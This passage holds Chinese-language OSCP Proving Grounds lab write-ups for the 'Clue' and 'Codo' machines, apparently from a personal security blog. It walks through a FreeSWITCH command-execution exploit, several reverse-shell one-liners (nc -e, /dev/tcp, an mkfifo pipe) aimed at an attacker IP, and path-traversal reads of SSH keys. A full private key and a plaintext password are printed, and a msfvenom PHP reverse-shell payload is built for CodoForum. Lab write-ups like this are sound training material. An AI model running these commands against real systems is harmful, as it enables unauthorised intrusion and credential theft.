<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python exploit.py --target <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span></span><br><span class="line"></span><br><span class="line">StrongClueConEight021</span><br><span class="line">b&#x27;Content-Type<span class="punctuation">:</span> auth/request\n\n&#x27;</span><br><span class="line">Authenticated - <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span><span class="punctuation">:</span><span class="number">8021</span></span><br><span class="line">Command executed successfully - <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span></span><br><span class="line">VULNERABLE USER<span class="punctuation">:</span> freeswitch</span><br><span class="line"># id</span><br><span class="line">StrongClueConEight021</span><br><span class="line">b&#x27;Content-Type<span class="punctuation">:</span> auth/request\n\n&#x27;</span><br><span class="line">Authenticated - <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span><span class="punctuation">:</span><span class="number">8021</span></span><br><span class="line">Content-Type<span class="punctuation">:</span> api/response</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">63</span></span><br><span class="line"></span><br><span class="line">uid=<span class="number">998</span>(freeswitch) gid=<span class="number">998</span>(freeswitch) groups=<span class="number">998</span>(freeswitch)</span><br><span class="line"></span><br><span class="line"># whoami</span><br><span class="line">StrongClueConEight021</span><br><span class="line">b&#x27;Content-Type<span class="punctuation">:</span> auth/request\n\n&#x27;</span><br><span class="line">Authenticated - <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span><span class="punctuation">:</span><span class="number">8021</span></span><br><span class="line">Content-Type<span class="punctuation">:</span> api/response</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">11</span></span><br><span class="line"></span><br><span class="line">freeswitch</span><br></pre></td></tr></table></figure>

<p>本地nc -nvlp 443， 反弹shell, 试了nc, busybox nc , python, bash -i &#x2F;tcp&#x2F;port 都不成功，并且确认网络是能ping通的</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"># which nc</span><br><span class="line">/usr/bin/nc</span><br><span class="line"></span><br><span class="line"># nc <span class="number">192.168</span><span class="number">.45</span><span class="number">.229</span> <span class="number">443</span> -e /bin/bash</span><br><span class="line">Error<span class="punctuation">:</span> timed out</span><br><span class="line">#</span><br><span class="line"># /usr/bin/nc <span class="number">192.168</span><span class="number">.45</span><span class="number">.184</span> <span class="number">443</span> -e /bin/bash</span><br><span class="line">Error<span class="punctuation">:</span> timed out</span><br><span class="line"></span><br><span class="line"># sh -i &gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.45</span><span class="number">.184</span>/<span class="number">443</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">-ERR no reply</span><br><span class="line"></span><br><span class="line"># rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">192.168</span><span class="number">.45</span><span class="number">.184</span> <span class="number">443</span> &gt;/tmp/f</span><br><span class="line">Error<span class="punctuation">:</span> timed out</span><br><span class="line"># busybox nc <span class="number">192.168</span><span class="number">.45</span><span class="number">.184</span> <span class="number">443</span> -e sh</span><br><span class="line">Error<span class="punctuation">:</span> timed out</span><br><span class="line"># which python</span><br><span class="line">/usr/bin/python</span><br><span class="line"></span><br><span class="line"># python -c &#x27;import pty; pty.spwan(<span class="string">&quot;bin/bash&quot;</span>)&#x27;</span><br><span class="line">-ERR no reply</span><br><span class="line"></span><br><span class="line"># ping <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> -c <span class="number">1</span></span><br><span class="line">StrongClueConEight021</span><br><span class="line">b&#x27;Content-Type<span class="punctuation">:</span> auth/request\n\n&#x27;</span><br><span class="line">Authenticated - <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span><span class="punctuation">:</span><span class="number">8021</span></span><br><span class="line">Content-Type<span class="punctuation">:</span> api/response</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">275</span></span><br><span class="line"></span><br><span class="line">PING <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> (<span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of data.</span><br><span class="line"><span class="number">64</span> bytes from <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span><span class="punctuation">:</span> icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">0.017</span> ms</span><br><span class="line"></span><br><span class="line">--- <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> ping statistics ---</span><br><span class="line"><span class="number">1</span> packets transmitted<span class="punctuation">,</span> <span class="number">1</span> received<span class="punctuation">,</span> <span class="number">0</span>% packet loss<span class="punctuation">,</span> time <span class="number">0</span>ms</span><br><span class="line">rtt min/avg/max/mdev = <span class="number">0.017</span>/<span class="number">0.017</span>/<span class="number">0.017</span>/<span class="number">0.000</span> ms</span><br></pre></td></tr></table></figure>

<p>到&#x2F;home下看下两个目录下都有什么文件</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"># ls -al /home/cassie</span><br><span class="line">StrongClueConEight021</span><br><span class="line">b&#x27;Content-Type<span class="punctuation">:</span> auth/request\n\n&#x27;</span><br><span class="line">Authenticated - <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span><span class="punctuation">:</span><span class="number">8021</span></span><br><span class="line">Content-Type<span class="punctuation">:</span> api/response</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">495</span></span><br><span class="line"></span><br><span class="line">total <span class="number">32</span></span><br><span class="line">drwxr-xr-x <span class="number">4</span> cassie cassie <span class="number">4096</span> Aug <span class="number">11</span>  <span class="number">2022</span> .</span><br><span class="line">drwxr-xr-x <span class="number">4</span> root   root   <span class="number">4096</span> Aug  <span class="number">5</span>  <span class="number">2022</span> ..</span><br><span class="line">lrwxrwxrwx <span class="number">1</span> root   root      <span class="number">9</span> Aug  <span class="number">5</span>  <span class="number">2022</span> .bash_history -&gt; /dev/<span class="literal"><span class="keyword">null</span></span></span><br><span class="line">-rw-r--r-- <span class="number">1</span> cassie cassie  <span class="number">220</span> Apr <span class="number">18</span>  <span class="number">2019</span> .bash_logout</span><br><span class="line">-rw-r--r-- <span class="number">1</span> cassie cassie <span class="number">3526</span> Apr <span class="number">18</span>  <span class="number">2019</span> .bashrc</span><br><span class="line">drwx------ <span class="number">3</span> cassie cassie <span class="number">4096</span> Aug <span class="number">11</span>  <span class="number">2022</span> .gnupg</span><br><span class="line">-rw------- <span class="number">1</span> cassie cassie <span class="number">1823</span> Aug <span class="number">11</span>  <span class="number">2022</span> id_rsa</span><br><span class="line">-rw-r--r-- <span class="number">1</span> cassie cassie  <span class="number">807</span> Apr <span class="number">18</span>  <span class="number">2019</span> .profile</span><br><span class="line">drwx------ <span class="number">2</span> cassie cassie <span class="number">4096</span> Aug <span class="number">11</span>  <span class="number">2022</span> .ssh</span><br><span class="line"></span><br><span class="line"># cat /home/cassie/id_rsa</span><br><span class="line">StrongClueConEight021</span><br><span class="line">b&#x27;Content-Type<span class="punctuation">:</span> auth/request\n\n&#x27;</span><br><span class="line">Authenticated - <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span><span class="punctuation">:</span><span class="number">8021</span></span><br><span class="line">Content-Type<span class="punctuation">:</span> api/response</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">14</span></span><br><span class="line"></span><br><span class="line">-ERR no reply</span><br><span class="line"></span><br><span class="line"># ls -al /home/anthoy</span><br><span class="line">StrongClueConEight021</span><br><span class="line">b&#x27;Content-Type<span class="punctuation">:</span> auth/request\n\n&#x27;</span><br><span class="line">Authenticated - <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span><span class="punctuation">:</span><span class="number">8021</span></span><br><span class="line">Content-Type<span class="punctuation">:</span> api/response</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">14</span></span><br><span class="line"></span><br><span class="line">-ERR no reply</span><br><span class="line"></span><br><span class="line"># cat /home/anthony/.bash_history</span><br><span class="line">StrongClueConEight021</span><br><span class="line">b&#x27;Content-Type<span class="punctuation">:</span> auth/request\n\n&#x27;</span><br><span class="line">Authenticated - <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span><span class="punctuation">:</span><span class="number">8021</span></span><br><span class="line">Content-Type<span class="punctuation">:</span> api/response</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">14</span></span><br><span class="line"></span><br><span class="line">-ERR no reply</span><br><span class="line"></span><br><span class="line"># ls -al /home/anthony</span><br><span class="line">StrongClueConEight021</span><br><span class="line">b&#x27;Content-Type<span class="punctuation">:</span> auth/request\n\n&#x27;</span><br><span class="line">Authenticated - <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span><span class="punctuation">:</span><span class="number">8021</span></span><br><span class="line">Content-Type<span class="punctuation">:</span> api/response</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">392</span></span><br><span class="line"></span><br><span class="line">total <span class="number">28</span></span><br><span class="line">drwxr-xr-x <span class="number">3</span> anthony anthony <span class="number">4096</span> Aug  <span class="number">5</span>  <span class="number">2022</span> .</span><br><span class="line">drwxr-xr-x <span class="number">4</span> root    root    <span class="number">4096</span> Aug  <span class="number">5</span>  <span class="number">2022</span> ..</span><br><span class="line">-rw------- <span class="number">1</span> anthony anthony  <span class="number">120</span> Aug  <span class="number">5</span>  <span class="number">2022</span> .bash_history</span><br><span class="line">-rw-r--r-- <span class="number">1</span> anthony anthony  <span class="number">220</span> Apr <span class="number">18</span>  <span class="number">2019</span> .bash_logout</span><br><span class="line">-rw-r--r-- <span class="number">1</span> anthony anthony <span class="number">3526</span> Apr <span class="number">18</span>  <span class="number">2019</span> .bashrc</span><br><span class="line">-rw-r--r-- <span class="number">1</span> anthony anthony  <span class="number">807</span> Apr <span class="number">18</span>  <span class="number">2019</span> .profile</span><br><span class="line">drwx------ <span class="number">2</span> anthony anthony <span class="number">4096</span> Aug  <span class="number">5</span>  <span class="number">2022</span> .ssh</span><br><span class="line"></span><br><span class="line"># cat /home/anthony/.bash_history</span><br><span class="line">StrongClueConEight021</span><br><span class="line">b&#x27;Content-Type<span class="punctuation">:</span> auth/request\n\n&#x27;</span><br><span class="line">Authenticated - <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span><span class="punctuation">:</span><span class="number">8021</span></span><br><span class="line">Content-Type<span class="punctuation">:</span> api/response</span><br><span class="line">Content-Length<span class="punctuation">:</span> <span class="number">14</span></span><br><span class="line"></span><br><span class="line">-ERR no reply</span><br></pre></td></tr></table></figure>

<p>&#x2F;home&#x2F;cassie下有个私钥文件，直接读取没有任何返回，应该freeswitch没有权限</p>
<p>使用cassandra 任意文件读取漏洞读取到私钥文件，修改私钥权限600, ssh <a href="mailto:&#x63;&#x61;&#115;&#x73;&#x61;&#110;&#100;&#x72;&#97;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#54;&#54;&#x2e;&#50;&#x34;&#48;">&#x63;&#x61;&#115;&#x73;&#x61;&#110;&#100;&#x72;&#97;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#54;&#54;&#x2e;&#50;&#x34;&#48;</a> -i id_rsa提示错误error in libcrypto</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">python <span class="number">49362.</span>py <span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> /home/cassie/id_rsa &gt; cassie_id_rsa</span><br><span class="line"></span><br><span class="line">cat cassie_id_rsa</span><br><span class="line"></span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe</span><br><span class="line">d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM</span><br><span class="line">jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m</span><br><span class="line">B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq</span><br><span class="line">gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/</span><br><span class="line">DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r</span><br><span class="line">acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE</span><br><span class="line">QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+<span class="number">7</span>QJx265XSRUkOd22wOoBws</span><br><span class="line">mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/<span class="number">9</span>qMrBuCs0xmlBvymscveVEhVpuNpK/RshP</span><br><span class="line">HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+<span class="number">2</span>wsg7PJlitBM5Orj6r8</span><br><span class="line">UWkAp9uw12pR7jjkWS8+avLLHsh/<span class="number">8</span>NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y</span><br><span class="line">etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M</span><br><span class="line">mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i</span><br><span class="line">CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+</span><br><span class="line"><span class="number">0</span>hu6jNH4YCYU3SGdwTDz/UJIh9/<span class="number">10</span>OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG</span><br><span class="line">Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/<span class="number">2</span>C</span><br><span class="line">gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG</span><br><span class="line">krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b</span><br><span class="line">yyQzy+CLBRAAAAgQD7g2V+<span class="number">1</span>vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys</span><br><span class="line">kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU</span><br><span class="line">DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN</span><br><span class="line">Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU</span><br><span class="line">iw4liAQFFhimnpld+<span class="number">7</span>/<span class="number">8</span>EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj</span><br><span class="line"><span class="number">4</span>oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh cassie@<span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> -i cassie_id_rsa</span><br><span class="line">Load key <span class="attr">&quot;cassie_id_rsa&quot;</span><span class="punctuation">:</span> error in libcrypto</span><br><span class="line">cassie@<span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span>&#x27;s password<span class="punctuation">:</span></span><br></pre></td></tr></table></figure>

<p>搜索一番后，是因为直接下载的私钥文件存在换行符不正确的问题（\r\n）， 在vscode中打开点击右下角的LF，更改成CRLF，重新登录，发现还是提示输入密码，然后又尝试了使用anthony账号也不正确</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ssh cassie@<span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> -i ~/id_rsa</span><br><span class="line">cassie@<span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span>&#x27;s password<span class="punctuation">:</span></span><br><span class="line">Permission denied<span class="punctuation">,</span> please try again.</span><br><span class="line">cassie@<span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span>&#x27;s password<span class="punctuation">:</span></span><br><span class="line"></span><br><span class="line">ssh anthony@<span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> -i ~/id_rsa</span><br><span class="line">anthony@<span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span>&#x27;s password<span class="punctuation">:</span></span><br></pre></td></tr></table></figure>

<p>难道是root的私钥文件，竟然登录成功了</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ssh root@<span class="number">192.168</span><span class="number">.166</span><span class="number">.240</span> -i ~/id_rsa</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc<span class="comment">/*/copyright.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="comment">permitted by applicable law.</span></span><br><span class="line"><span class="comment">id</span></span><br><span class="line"><span class="comment">uid=0(root) gid=0(root) groups=0(root)</span></span><br></pre></td></tr></table></figure>

<h1 id="官方walk-through"><a href="#官方walk-through" class="headerlink" title="官方walk through"></a>官方walk through</h1><ol>
<li><p>msf 获取到shell</p>
</li>
<li><p>在获取到freeswitch shell后，使用cassie：SecondBiteTheApple330切换到cassie账号（sshd_config限制了只有root和anthony能ssh登录），发现cassie可以不使用密码执行sudo cassandra-web， 使用root账号可以读取系统上所有文件</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">freeswitch@clue:/$ su - cassie</span><br><span class="line">Password: SecondBiteTheApple330</span><br><span class="line">cassie@clue:~$ sudo -l</span><br><span class="line">Matching Defaults entries for cassie on clue:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line">User cassie may run the following commands on clue:</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/cassandra-web</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>通过444端口查看&#x2F;home&#x2F;anthony&#x2F;.bash_history 文件， anthony生成了密钥对，然后把公钥复制到root&#x2F;.ssh&#x2F;authorized_keys文件</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">cassie@clue<span class="punctuation">:</span>~$ curl localhost<span class="punctuation">:</span><span class="number">444</span>/../../../../../../../../home/anthony/.bash_history --path-as-is</span><br><span class="line">clear</span><br><span class="line">ls -la</span><br><span class="line">ssh-keygen</span><br><span class="line">cp .ssh/id_rsa.pub .ssh/authorized_keys</span><br><span class="line">sudo cp .ssh/id_rsa.pub /root/.ssh/authorized_keys</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载私钥文件，ssh <a href="mailto:&#114;&#x6f;&#111;&#x74;&#64;&#49;&#50;&#55;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#49;">&#114;&#x6f;&#111;&#x74;&#64;&#49;&#50;&#55;&#x2e;&#x30;&#x2e;&#48;&#x2e;&#49;</a> -i id_rsa, 根据这一步怀疑是官方忘记清理&#x2F;home&#x2F;cassie&#x2F;id_rsa了，我才能直接读取后登录root.</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">cassie@clue<span class="punctuation">:</span>~$ curl localhost<span class="punctuation">:</span><span class="number">444</span>/../../../../../../../../home/anthony/.ssh/id_rsa --path-as-is -o id_rsa</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"><span class="number">100</span>  <span class="number">1823</span>  <span class="number">100</span>  <span class="number">1823</span>    <span class="number">0</span>     <span class="number">0</span>   <span class="number">178</span>k      <span class="number">0</span> --<span class="punctuation">:</span>--<span class="punctuation">:</span>-- --<span class="punctuation">:</span>--<span class="punctuation">:</span>-- --<span class="punctuation">:</span>--<span class="punctuation">:</span>--  <span class="number">197</span>k</span><br><span class="line">cassie@clue<span class="punctuation">:</span>~$ chmod <span class="number">600</span> id_rsa</span><br><span class="line">cassie@clue<span class="punctuation">:</span>~$ ls -l id_rsa</span><br><span class="line">-rw------- <span class="number">1</span> cassie cassie <span class="number">1823</span> Aug  <span class="number">2</span> <span class="number">16</span><span class="punctuation">:</span><span class="number">40</span> id_rsa</span><br><span class="line">cassie@clue<span class="punctuation">:</span>~$ ssh -i id_rsa -l root <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">The authenticity of host &#x27;<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> (<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>)&#x27; can&#x27;t be established.</span><br><span class="line">...</span><br><span class="line">Linux clue <span class="number">4.19</span><span class="number">.0</span><span class="number">-21</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span><span class="number">.249</span><span class="number">-2</span> (<span class="number">2022</span><span class="number">-06</span><span class="number">-30</span>) x86_64</span><br><span class="line">...</span><br><span class="line">root@clue<span class="punctuation">:</span>~# id</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>如果&#x2F;home&#x2F;cassie目录下没有id_rsa文件，我还能成功吗？ 难</p>
<ol>
<li><p>我为什么没有得到freeswitch的交互式shell</p>
<ol>
<li><p>这次深刻体会到了前人经验中所说的：机器上开放了哪些端口，nc 反弹shell就是用哪些端口，测试8021和80能成功，其他端口都可以</p>
</li>
<li><p>使用443端口时会返回timeout，而这个timeout实际是因为expolit.py中设置了5s的超时，而不是服务器主动断开的，当时让我有即使我反弹成功了，5s后也会断开的错觉，没有继续尝试<br> <img data-src="https://thiiiiink.com/202508/asynccode-39.png.png"></p>
</li>
</ol>
<p>   exploit代码一定得好好读，弄清楚原理
 </p>
</li>
<li><p>忽略了cassie的密码这样的重要信息，一定得细致，收集信息是关键</p>
</li>
<li><p>在使用freeswitch读取anthoy&#x2F;.bash_history没有权限之后，即使在使用cassia sudo 能读取全部文件之后，我大概率会忽略这个文件，因为心理暗示自己已经查看过来，是自己的大忌，总想着先排除一些信息，把问题缩小，以后一定得注意在获取新的账号权限后，把之前的信息收集再做一次</p>
</li>
</ol>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Codo</title>
    <url>/post/20250311024753.html</url>
    <content><![CDATA[<h1 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h1><h2 id="autorecon"><a href="#autorecon" class="headerlink" title="autorecon"></a>autorecon</h2><p><img data-src="https://thiiiiink.com/202508/asynccode-49.png.png"></p>
<h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><p>目录爆破</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="number">200</span>      GET       <span class="number">21</span>l      <span class="number">100</span>w     <span class="number">8298</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/sites/default/assets/img/profiles/icons/6488ee7e82484.png</span></span><br><span class="line"><span class="number">200</span>      GET     <span class="number">1045</span>l     <span class="number">2095</span>w    <span class="number">45225</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/index.php</span></span><br><span class="line"><span class="number">200</span>      GET      <span class="number">463</span>l      <span class="number">925</span>w    <span class="number">10236</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/sites/default/assets/oembedget/oembed-get.css</span></span><br><span class="line"><span class="number">200</span>      GET      <span class="number">573</span>l     <span class="number">4542</span>w   <span class="number">234772</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/cache/css/aa490a284e2d3749739e0849967c9508.css</span></span><br><span class="line"><span class="number">200</span>      GET     <span class="number">1045</span>l     <span class="number">2095</span>w    <span class="number">45225</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/</span></span><br><span class="line"><span class="number">200</span>      GET      <span class="number">165</span>l      <span class="number">471</span>w     <span class="number">8135</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/admin/index.php</span></span><br><span class="line"><span class="number">200</span>      GET      <span class="number">165</span>l      <span class="number">471</span>w     <span class="number">8135</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/admin/</span></span><br><span class="line"><span class="number">200</span>      GET       <span class="number">19</span>l       <span class="number">93</span>w     <span class="number">1495</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/cache/</span></span><br><span class="line"><span class="number">500</span>      GET        <span class="number">0</span>l        <span class="number">0</span>w        <span class="number">0</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/routes.php</span></span><br><span class="line"><span class="number">200</span>      GET       <span class="number">16</span>l       <span class="number">60</span>w      <span class="number">937</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/sites/</span></span><br><span class="line"><span class="number">200</span>      GET       <span class="number">14</span>l       <span class="number">25</span>w      <span class="number">350</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/sys/composer.json</span></span><br><span class="line"><span class="number">200</span>      GET        <span class="number">0</span>l        <span class="number">0</span>w        <span class="number">0</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/sys/load.php</span></span><br><span class="line"><span class="number">200</span>      GET        <span class="number">5</span>l       <span class="number">29</span>w      <span class="number">185</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/sys/readme.txt</span></span><br><span class="line"><span class="number">200</span>      GET      <span class="number">944</span>l     <span class="number">1731</span>w    <span class="number">32789</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/sys/composer.lock</span></span><br><span class="line"><span class="number">200</span>      GET       <span class="number">24</span>l      <span class="number">146</span>w     <span class="number">2518</span>c http<span class="punctuation">:</span><span class="comment">//192.168.103.23/sys/</span></span><br></pre></td></tr></table></figure>

<p>弱密码admin&#x2F;admin登录之后，看到版本 CodoForum V5.1</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-48.png.png"></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">ss codo</span><br><span class="line">-------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                |  Path</span><br><span class="line">-------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">CodoForum <span class="number">2.5</span><span class="number">.1</span> - Arbitrary File Download                                                                     | php/webapps/<span class="number">36320.</span>txt</span><br><span class="line">CodoForum <span class="number">3.2</span><span class="number">.1</span> - SQL Injection                                                                               | php/webapps/<span class="number">40150.</span>txt</span><br><span class="line">CodoForum <span class="number">3.3</span><span class="number">.1</span> - Multiple SQL Injections                                                                     | php/webapps/<span class="number">37820.</span>txt</span><br><span class="line">CodoForum <span class="number">3.4</span> - Persistent Cross-Site Scripting                                                               | php/webapps/<span class="number">40015.</span>txt</span><br><span class="line">Codoforum <span class="number">4.8</span><span class="number">.3</span> - &#x27;input_txt&#x27; Persistent Cross-Site Scripting                                                 | php/webapps/<span class="number">47886.</span>txt</span><br><span class="line">Codoforum <span class="number">4.8</span><span class="number">.3</span> - Persistent Cross-Site Scripting                                                             | php/webapps/<span class="number">47876.</span>txt</span><br><span class="line">CodoForum v5<span class="number">.1</span> - Remote Code Execution (RCE)                                                                  | php/webapps/<span class="number">50978.</span>py</span><br><span class="line">Qcodo Development Framework <span class="number">0.3</span><span class="number">.3</span> - Full Information Disclosure                                               | php/webapps/<span class="number">16116.</span>txt</span><br><span class="line">-------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes<span class="punctuation">:</span> No Results</span><br><span class="line">Papers<span class="punctuation">:</span> No Results</span><br></pre></td></tr></table></figure>

<p>50987.py 代码写的不咋地，错误也没有日志， 直接搜一下发现利用路径是</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 上传文件</span><br><span class="line">http<span class="punctuation">:</span><span class="comment">//192.168.103.23/admin/index.php?page=config</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 执行 </span><br><span class="line">http<span class="punctuation">:</span><span class="comment">//192.168.103.23/sites/default/assets/img/attachments/backdoor.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom生成backdoor.php</span><br><span class="line">msfvenom -p php/reverse_php LHOST=<span class="number">192.168</span><span class="number">.45</span><span class="number">.229</span> LPORT=<span class="number">4445</span> -f raw -o backdoor.php</span><br></pre></td></tr></table></figure>

<p>反弹shell之后，直接上传linpeas并执行</p>
